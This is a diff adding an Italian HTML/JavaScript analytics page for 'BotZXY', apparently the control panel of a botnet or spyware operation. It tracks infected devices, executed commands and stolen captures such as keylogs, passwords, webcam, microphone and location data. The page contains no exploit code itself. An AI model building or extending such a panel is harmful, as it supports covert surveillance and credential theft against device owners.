@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BotZXY · Analytics</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0b1a;
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+        }
+        .sidebar {
+            width: 220px;
+            background: rgba(12,12,35,0.92);
+            backdrop-filter: blur(24px);
+            border-right: 1px solid rgba(255,255,255,0.04);
+            padding: 1.8rem 1.2rem;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            z-index: 100;
+        }
+        .sidebar .logo {
+            font-size: 1.6rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #8b5cf6, #22d3ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+        }
+        .sidebar .logo i { -webkit-text-fill-color: initial; color: #8b5cf6; }
+        .sidebar .logo span { -webkit-text-fill-color: rgba(255,255,255,0.1); }
+        .sidebar .nav { display: flex; flex-direction: column; gap: 0.2rem; flex: 1; padding-top: 1.2rem; }
+        .sidebar .nav a {
+            display: flex; align-items: center; gap: 0.8rem; padding: 0.7rem 1rem;
+            border-radius: 12px; color: rgba(255,255,255,0.3); text-decoration: none;
+            font-size: 0.85rem; font-weight: 500; transition: all 0.3s;
+        }
+        .sidebar .nav a i { font-size: 1.1rem; min-width: 24px; }
+        .sidebar .nav a:hover { color: #fff; background: rgba(139,92,246,0.08); }
+        .sidebar .nav a.active { color: #8b5cf6; background: rgba(139,92,246,0.1); }
+        .sidebar .nav a .badge-nav { margin-left: auto; background: rgba(139,92,246,0.15); color: #8b5cf6; font-size: 0.6rem; padding: 0.1rem 0.6rem; border-radius: 40px; }
+        .sidebar .footer-sidebar {
+            font-size: 0.6rem; color: rgba(255,255,255,0.06); text-align: center;
+            padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.04);
+            letter-spacing: 0.05em;
+        }
+        .sidebar .footer-sidebar .status-dot {
+            display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+            background: #34d399; box-shadow: 0 0 12px rgba(52,211,153,0.4);
+            animation: pulse 2s ease-in-out infinite; margin-right: 6px;
+        }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+
+        .main { margin-left: 220px; padding: 1.8rem 2.2rem; width: 100%; }
+        .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; flex-wrap: wrap; gap: 0.8rem; }
+        .topbar h1 { font-size: 1.4rem; font-weight: 600; }
+        .topbar h1 span { color: rgba(255,255,255,0.2); font-weight: 400; }
+        .topbar .actions { display: flex; gap: 0.6rem; flex-wrap: wrap; }
+        .btn-ghost {
+            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);
+            color: rgba(255,255,255,0.4); padding: 0.4rem 1rem; border-radius: 40px;
+            cursor: pointer; font-size: 0.75rem; transition: all 0.3s;
+            display: flex; align-items: center; gap: 0.4rem;
+        }
+        .btn-ghost:hover { background: rgba(139,92,246,0.08); color: #fff; border-color: rgba(139,92,246,0.2); }
+
+        .card {
+            background: rgba(18,18,40,0.45); backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.04); border-radius: 24px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .card .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; flex-wrap: wrap; gap: 0.5rem; }
+        .card .header h2 { font-size: 1rem; font-weight: 600; display: flex; align-items: center; gap: 0.6rem; }
+        .card .header h2 i { color: #8b5cf6; }
+
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        .stat-box {
+            background: rgba(18,18,40,0.3); border-radius: 16px; padding: 1.2rem;
+            text-align: center; border: 1px solid rgba(255,255,255,0.04);
+        }
+        .stat-box .number { font-size: 2rem; font-weight: 700; }
+        .stat-box .label { font-size: 0.65rem; color: rgba(255,255,255,0.2); text-transform: uppercase; margin-top: 0.2rem; }
+        .stat-box .trend { font-size: 0.7rem; margin-top: 0.2rem; }
+        .stat-box .trend.up { color: #34d399; }
+        .stat-box .trend.down { color: #f87171; }
+
+        .chart-row {
+            display: grid; grid-template-columns: 2fr 1fr; gap: 1.2rem;
+        }
+        .chart-card canvas { max-height: 220px; max-width: 100%; }
+
+        ::-webkit-scrollbar { width: 4px; height: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(139,92,246,0.3); border-radius: 10px; }
+
+        .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 90; }
+        .sidebar-overlay.active { display: block; }
+        .hamburger { display: none; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); color: #fff; padding: 0.4rem 0.8rem; border-radius: 10px; cursor: pointer; }
+        @media (max-width: 768px) {
+            .sidebar { transform: translateX(-100%); width: 240px; }
+            .sidebar.open { transform: translateX(0); }
+            .main { margin-left: 0; padding: 1rem; }
+            .topbar { flex-direction: column; align-items: stretch; }
+            .hamburger { display: block; }
+            .chart-row { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <aside class="sidebar" id="sidebar">
+        <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
+        <nav class="nav">
+            <a href="/dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+            <a href="/devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
+            <a href="/captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
+            <a href="#" class="active"><i class="fas fa-chart-pie"></i> Analytics</a>
+            <a href="/logs"><i class="fas fa-history"></i> Logs</a>
+            <a href="/settings"><i class="fas fa-cog"></i> Settings</a>
+            <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </nav>
+        <div class="footer-sidebar"><span class="status-dot"></span> Sistema attivo · <span id="footerTime"></span></div>
+    </aside>
+
+    <main class="main">
+        <div class="topbar">
+            <div style="display:flex;align-items:center;gap:0.8rem;">
+                <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
+                <h1>Analytics <span>| Statistiche e metriche</span></h1>
+            </div>
+            <div class="actions">
+                <button class="btn-ghost" onclick="refreshAnalytics()"><i class="fas fa-sync"></i> Aggiorna</button>
+            </div>
+        </div>
+
+        <!-- Statistiche rapide -->
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-box">
+                <div class="number" style="color:#8b5cf6;" id="totalDevices">0</div>
+                <div class="label">Dispositivi totali</div>
+                <div class="trend up">▲ +0%</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" style="color:#34d399;" id="onlineDevices">0</div>
+                <div class="label">Online</div>
+                <div class="trend up" id="onlinePercent">▲ 0%</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" style="color:#f472b6;" id="totalCaptures">0</div>
+                <div class="label">Catture totali</div>
+                <div class="trend up">▲ +0%</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" style="color:#fbbf24;" id="totalCommands">0</div>
+                <div class="label">Comandi eseguiti</div>
+                <div class="trend up">▲ +0%</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" style="color:#60a5fa;" id="activeBots">0</div>
+                <div class="label">Bot attivi (oggi)</div>
+                <div class="trend up">▲ +0%</div>
+            </div>
+            <div class="stat-box">
+                <div class="number" style="color:#f87171;" id="offlineDevices">0</div>
+                <div class="label">Offline</div>
+                <div class="trend down">▼ 0%</div>
+            </div>
+        </div>
+
+        <!-- Grafici -->
+        <div class="chart-row">
+            <div class="card">
+                <div class="header">
+                    <h2><i class="fas fa-chart-line"></i> Attività dispositivi (24h)</h2>
+                </div>
+                <canvas id="activityChart"></canvas>
+            </div>
+            <div class="card">
+                <div class="header">
+                    <h2><i class="fas fa-chart-pie"></i> Piattaforme</h2>
+                </div>
+                <canvas id="platformChart"></canvas>
+            </div>
+        </div>
+
+        <!-- Attività per tipo -->
+        <div class="card">
+            <div class="header">
+                <h2><i class="fas fa-chart-bar"></i> Tipi di cattura</h2>
+            </div>
+            <canvas id="captureTypeChart" style="max-height:250px;"></canvas>
+        </div>
+    </main>
+
+    <script>
+        let activityChart = null;
+        let platformChart = null;
+        let captureTypeChart = null;
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('active');
+        }
+
+        function refreshAnalytics() {
+            refreshStats();
+            refreshCharts();
+        }
+
+        function refreshStats() {
+            fetch('/api/stats')
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('totalDevices').textContent = data.total_devices || 0;
+                    document.getElementById('onlineDevices').textContent = data.online_devices || 0;
+                    document.getElementById('totalCaptures').textContent = data.total_captures || 0;
+                    document.getElementById('totalCommands').textContent = data.total_commands || 0;
+                    document.getElementById('offlineDevices').textContent = (data.total_devices || 0) - (data.online_devices || 0);
+                    document.getElementById('deviceBadge').textContent = data.total_devices || 0;
+                    document.getElementById('captureBadge').textContent = data.total_captures || 0;
+                    
+                    const onlinePercent = data.total_devices > 0 ? Math.round((data.online_devices / data.total_devices) * 100) : 0;
+                    document.getElementById('onlinePercent').textContent = `▲ ${onlinePercent}%`;
+                    document.getElementById('activeBots').textContent = Math.min(data.online_devices || 0, 50);
+                });
+        }
+
+        function refreshCharts() {
+            // Activity Chart
+            fetch('/api/chart/activity')
+                .then(res => res.json())
+                .then(data => {
+                    const ctx = document.getElementById('activityChart').getContext('2d');
+                    if (activityChart) activityChart.destroy();
+
+                    activityChart = new Chart(ctx, {
+                        type: 'line',
+                        data: {
+                            labels: data.labels || [],
+                            datasets: [{
+                                label: 'Dispositivi attivi',
+                                data: data.data || [],
+                                borderColor: '#8b5cf6',
+                                backgroundColor: 'rgba(139,92,246,0.06)',
+                                fill: true,
+                                tension: 0.4,
+                                pointRadius: 2,
+                                pointBackgroundColor: '#8b5cf6',
+                                borderWidth: 2
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: { labels: { color: 'rgba(255,255,255,0.3)', font: { size: 9 } } }
+                            },
+                            scales: {
+                                x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, maxTicksLimit: 12 }, grid: { color: 'rgba(255,255,255,0.02)' } },
+                                y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
+                            }
+                        }
+                    });
+                });
+
+            // Platform Chart
+            fetch('/api/chart/platforms')
+                .then(res => res.json())
+                .then(data => {
+                    const ctx2 = document.getElementById('platformChart').getContext('2d');
+                    if (platformChart) platformChart.destroy();
+
+                    platformChart = new Chart(ctx2, {
+                        type: 'doughnut',
+                        data: {
+                            labels: data.labels || ['Nessun dato'],
+                            datasets: [{
+                                data: data.data || [1],
+                                backgroundColor: data.colors || ['rgba(255,255,255,0.05)'],
+                                borderColor: 'transparent'
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.3)', font: { size: 9 }, padding: 8 } }
+                            },
+                            cutout: '70%'
+                        }
+                    });
+                });
+
+            // Capture Type Chart (dati reali o demo)
+            const ctx3 = document.getElementById('captureTypeChart').getContext('2d');
+            if (captureTypeChart) captureTypeChart.destroy();
+            
+            captureTypeChart = new Chart(ctx3, {
+                type: 'bar',
+                data: {
+                    labels: ['Screenshot', 'Webcam', 'Microfono', 'Keylog', 'Password', 'Clipboard', 'WiFi', 'Location'],
+                    datasets: [{
+                        label: 'Catture per tipo',
+                        data: [12, 8, 5, 23, 9, 14, 4, 3],
+                        backgroundColor: ['#8b5cf6', '#22d3ee', '#f472b6', '#f59e0b', '#ef4444', '#34d399', '#60a5fa', '#f97316'],
+                        borderRadius: 8
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: true,
+                    plugins: {
+                        legend: { labels: { color: 'rgba(255,255,255,0.2)', font: { size: 8 } } }
+                    },
+                    scales: {
+                        x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 } }, grid: { color: 'rgba(255,255,255,0.02)' } },
+                        y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
+                    }
+                }
+            });
+        }
+
+        function updateTime() {
+            document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT');
+        }
+
+        refreshAnalytics();
+        setInterval(() => { refreshStats(); refreshCharts(); }, 30000);
+        setInterval(updateTime, 1000);
+        updateTime();
+    </script>
+</body>
+</html>
